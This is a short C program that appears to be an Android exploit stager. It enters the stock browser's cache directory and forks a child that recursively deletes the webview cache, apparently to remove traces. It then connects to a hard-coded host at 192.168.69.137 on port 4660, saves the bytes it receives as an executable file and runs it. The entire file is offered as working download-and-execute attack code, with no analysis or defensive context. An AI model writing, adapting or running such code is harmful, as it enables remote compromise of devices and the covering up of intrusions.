#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netdb.h>
 
#define DEBUG 0
#define BUFFER_SIZE 0x400

int main(int argc, char** argv) {

  char* dir[] = { "/app-cache/com.android.browser/cache", "/data/data/com.android.browser/cache"} ;
  char* cache_relative = "./webviewCache";
  char* rm = "/system/bin/rm";
  char* recursive = "-R";
  char* filename = "./e3ed72e1";

  int cache_dir_found = 0xff;
  int i;

  for( i = 0 ; i < 2 ; i++ ) {
    cache_dir_found = chdir(dir[i]) ;
    if( !cache_dir_found )
      break;
  }
  

  
  if( DEBUG ) {
    char out[50];
    getcwd(out, 50);
    printf("chdir:%d, %d - %s: %s\n", cache_dir_found, i, dir[i], out);
  }

  pid_t child = fork();

  if( child == 0 ) {
    if( DEBUG )
      printf("fork %d\n", child);
    
    char* argz[] = {rm, recursive, cache_relative };
    execve(rm, argz, NULL);
  }
    
  struct addrinfo hints, *res;
  int sockfd;

  memset(&hints, 0, sizeof hints );
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  
  getaddrinfo("192.168.69.137", "4660", &hints, &res);

  sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
  
  connect(sockfd, res->ai_addr, res->ai_addrlen);
  
  int filefd = open(filename, O_RDWR|O_CREAT|O_TRUNC, S_IRWXU);
  char* buffer[BUFFER_SIZE];
  int length = 0;

  while( (length = read(sockfd, buffer, BUFFER_SIZE) ) !=0 )
    write(filefd, buffer, length);
  
  close(filefd);
  close(sockfd);
  
  char* argz[] = { filename };
  execve(filename, argz, NULL);


}













